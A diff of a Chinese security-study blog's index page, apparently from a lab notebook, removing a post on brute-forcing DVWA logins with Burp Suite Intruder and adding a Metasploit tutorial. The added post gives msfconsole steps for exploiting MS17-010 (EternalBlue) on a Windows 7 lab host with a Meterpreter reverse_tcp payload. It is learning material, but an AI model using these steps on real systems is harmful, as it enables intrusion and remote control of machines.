@@ -428,41 +428,6 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2021/05/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3./">
-                Untitled
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2021-05-18</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>@<a href="%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3">TOC</a></p>
-<h2 id="什么是暴力破解"><a href="#什么是暴力破解" class="headerlink" title="什么是暴力破解"></a>什么是暴力破解</h2><p>一、所谓暴力破解，就是在不知道用户名和密码的情况下，通过工具软件利用字典文件对用户名和密码依次进行尝试。从而最终将用户名或密码破解出来。<br>二、常用的字典文件</p>
-<ul>
-<li>常用的账号密码，比如top100密码字典、top500用户名字典</li>
-<li>互联网上呗拖库后的账号密码，比如当年CSDN泄露的600w用户信息。</li>
-<li>使用工具软件按照指定的规则进行排列组合算法生成的字典，比如生日字典等。</li>
-</ul>
-<h2 id="暴力破解工具——burpsuite"><a href="#暴力破解工具——burpsuite" class="headerlink" title="暴力破解工具——burpsuite"></a>暴力破解工具——burpsuite</h2><p>一、什么是burpsuite:Burp Suite是用于攻击web应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP消息、持久性、认证、代理、日志、警报。<br>二、模块<br>1、Porxy（代理）：代理、处理HTTP请求以及处理HTTP响应。<br><img src="https://img-blog.csdnimg.cn/20210417102319140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、Intruder（攻击）：Inturder模块可以将数据包里指定的参数设置成变量（变量也就是要准备攻击的目标），然后再利用字典文件去替换变量里的值，所以常用于自动化猜测或暴力破解过程中。<br><img src="https://img-blog.csdnimg.cn/20210424150339953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="实战举例（DVWA）"><a href="#实战举例（DVWA）" class="headerlink" title="实战举例（DVWA）"></a>实战举例（DVWA）</h2><p><img src="https://img-blog.csdnimg.cn/2021042415094955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>抓包<br><img src="https://img-blog.csdnimg.cn/20210424151103328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>注意：在Burpsuite中，Inturder模块中Position中攻击类型：<br>1、Sriper：狙击手，可以指定多个变量同时破解，但只设置一个字典文件，将指定的变量依次用字典文件内容进行替换。<br>2、Battering ram:攻城锤，可以指定多个变量，但仍只设置一个字典文件，将所有的变量一起用字典内容进行替换。<br>3、Ptichfork:草叉子，可以指定多个变量，但需要为每个变量分别设置一个字典文件，然后用对应的字典内容对变量同时进行替换。<br>4、Cluster bomb:集束炸弹，指定多个变量，并为每个变量分别设置一个字典文件，然后用字典内容组合对变量进行替换。</strong><br>设置攻击的对象            <img src="https://img-blog.csdnimg.cn/20210424152509679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>载荷类型“Payload type”<br><strong>1、Simple list :可以手动添加字典列表，也可以导入Burpsuite目常的子典，百导人自定义的字典。<br>2、Runtime file :只能加载自定义的字典。</strong><br>3、Numbers:设定一个数值范围，从范围内依欠或随机取值进行测试。<br>4、Brute forcer :自己定义字符范围来生成字典文件。<br>Grep-Match：<br>1、设置对与不对的标准，在靶场中如果用户名密码不正确则会提示：Username and/or password incorrect，则设置 Grep-Match为Username and/or password incorrect<br>2、有的页面在用户登录失败时并不出现错误提示，而是仍返回到登录页面，这时就可以从登录页面中提取部分代码作为关键字，比如form action=”#” method=”GET”<br>3、也可通过Length字段进行判断，由于密码正确和密码错误的页面内容肯定不同因而Length字段也会出现区别。<br><img src="https://img-blog.csdnimg.cn/20210424155155562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
             <a href="/2021/05/18/%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E4%B8%80/">
                 Untitled
             </a>
@@ -487,6 +452,39 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[数以万计的家庭] -- 同轴电缆 --&gt; B((光纤节点))</span><br><span class="line">A[数以万计的家庭]--&gt; C((光纤节点)) </span><br><span class="line">B --&gt;D[CMTS]</span><br><span class="line">C --&gt;D[CMTS]</span><br><span class="line">D --&gt;F[因特网]</span><br></pre></td></tr></table></figure>
 <p>电缆因特网接入需要特殊的调制解调器，这种调制解调器被称为电缆调制解调器。如同DSL调制解调器，电缆解调器通常是一个外部设备，通过一个以太网连接到家庭PC（以太网后面会介绍到）在电缆头端，电缆调制解调器端接系统与DSL网络的DSLAM具有类似的功能，即将来许多下行家庭中的电缆调制解调器发送的模拟信号转换回数字形式。<br>&lt;3&gt;电缆因特网接入特征：<br>1.接入通常是不对称的，下行信道分配的传输速率通常比上行信道高。<br>2.共享广播媒体。如果几个用户同时经下行信道下载0一个视频文件，每个用户接收文件的实际速率大大低于电缆总计的下行速率</p>
 <h2 id="排队时延和分组丢失"><a href="#排队时延和分组丢失" class="headerlink" title="排队时延和分组丢失"></a>排队时延和分组丢失</h2><p>每台分组交换机有多条链路与之相连。对于每条相连的链路,该分组交换机具有一个输出缓存(output buffer,也称为输出队列(output queue)),它用于存储路由器准备发往那条链路的分组。该输出缓存在分组交换中起着重要的作用。除了存储转发时延以外,分组还要承受输出缓存的排队时延(queuing delay)。这些时延是变化的,变化的程度取决于网络的拥塞程度。因为缓存空间的大小是有限的,一个到达的分组可能发现该缓存已被其他等待传输的分组完全充满了。在此情况下,将出现分组丢失(丢包)(packet loss),到达的分组或已经排队的分组之一将被丢弃。</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2021/05/18/%E6%B5%85%E8%B0%88msf/">
+                Untitled
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2021-05-18</span>
+            
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p> @<a href="Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8">TOC</a></p>
+<h2 id="Metasploit渗透测试框架介绍"><a href="#Metasploit渗透测试框架介绍" class="headerlink" title="Metasploit渗透测试框架介绍"></a>Metasploit渗透测试框架介绍</h2><p><img src="https://img-blog.csdnimg.cn/20210410103503577.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="1、简介：Metasploit就是一个漏洞框架。它的全称叫做The Metasploit Framework，简称MSF。是一个免费、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。
+2、Metasploit体系框架"><br>&lt;1&gt;基础库：Metasploit基础库文件位于源码目录路径下的libraries目录中，包括Rex，framework和framework-base三部分。<br> Rex是整个框架所依赖的最基础的一些组件，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、postgreSQL以及MYSQL数据库支持等；<br> &lt;2&gt;模块：模块组织按照不同的用途分为6种类型的模块<br> 分为辅助模块（Aux）、渗透攻击模块（Exploits）、后渗透攻击模块（Post）、攻击载荷模块（payloads）、编码器模块（Encoders）、空指令模块（Nops）。<br> 注：payload又称攻击载荷，主要是用来建立目标机与攻击机稳定连接的，可返回shell，也可以进行程序注入等。<strong>可以理解为后门</strong><br> &lt;3&gt;插件：插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如Nessus、OpenVAS漏洞扫描器等<br> &lt;4&gt;接口:包括msfconsole控制终端、msfcli命令行、msfgui图形化界面、armitage图形化界面以及msfapi远程调用接口。e<br> &lt;5&gt;功能程序: metasploit还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用metasploit框架内部能力完成一些特定任务。比如msfpayload、msfencode和msfvenom可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。</p>
+<h2 id="Metasploit目录"><a href="#Metasploit目录" class="headerlink" title="Metasploit目录"></a>Metasploit目录</h2><p><img src="https://img-blog.csdnimg.cn/2021041011024921.png" alt="在这里插入图片描述">data是Metasploit使用的可编辑文件<br>modules是模块<br>lib是框架<br>plugins是插件<br>scripts是Metasploit和其他脚本</p>
+<h2 id="实战训练"><a href="#实战训练" class="headerlink" title="实战训练"></a>实战训练</h2><p>攻击机：kali2020<br>被攻击机：windows7（445端口开启、windowsdefener关闭）<br>第一步：打开msf<br><img src="https://img-blog.csdnimg.cn/2021042416135198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第二步：永恒之蓝漏洞编号为ms17-010</p>
+<p><img src="https://img-blog.csdnimg.cn/20210424161947609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>第三步：利用辅助模块扫描目标<br>use 1<br><img src="https://img-blog.csdnimg.cn/2021042416223116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看所需设置：options<br>yes为必须设置<br>设置目标地址：set rhosts +IP地址<br>设置目标端口：set rpost +445<br>攻击：run<br>第四步：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210424163908565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看所需设置options<br>设置目标地址：set RHOSTS windows7ip<br>设置目标端口：set RPORT 445<br>设置payload：set payload windows/x64/meterpreter/reverse_tcp<br>设置本地地址：set LHOST 本地IP<br>攻击：run</p>
 
         </div>
     
